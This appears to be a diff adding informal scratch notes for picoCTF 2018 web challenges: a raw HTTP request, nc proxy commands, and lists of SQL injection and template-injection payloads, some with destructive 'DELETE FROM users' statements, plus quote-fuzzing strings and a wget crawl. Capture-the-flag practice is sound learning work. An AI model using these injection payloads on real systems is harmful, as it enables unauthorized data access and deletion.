@@ -1,0 +1,69 @@
+printf "POST flag.local HTTP/1.1\r\nHost: 2018shell.picoctf.com:57775\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nCookie: _ga=GA1.2.1789539403.1595786703; _gid=GA1.2.327029422.1596906931\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n\r\n"
+
+
+nc -P realbusinessuser:potoooooooo  -x flag.local -X connect 2018shell.picoctf.com 57775 -vv
+
+Connect to smtphost:25 through a SOCKS4 server on port 1080.
+
+    ncat --proxy socks4host --proxy-type socks4 --proxy-auth joe smtphost 25
+
+                                     ⬇ 
+INSERT INTO users ('name','password'  )
+            VALUES( val1, 'val2' , adminSIPORFAVOR )
+  
+    1234', 1
+  
+    1',1
+
+    http://2018shell.picoctf.com:51878/list_cards?Question=blabla
+
+
+{{1' or  1=1; DELETE * FROM users;}}
+    
+
+a').all();or1=1;DELETE*FROM users;
+
+
+Question: {{print 2}}
+
+<h1>Members</h1>
+<ul>
+{% for user in users %}
+  <li>{{ user.username|e }}</li>
+{% endfor %}
+
+{%for user in users %}{{user}}{% endfor %}
+
+ola ``; k ase
+ola'); ke ase
+ola ";wew 
+ola %27 sas 
+ola`); ke ase
+ola''); ke ase
+ola ""k ase
+ola"); ke ase
+ola""); ke ase
+
+
+wget --spider -r --no-parent -http-user=pelos --http-password=pelos "http://2018shell.picoctf.com:51878" 
+1
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+
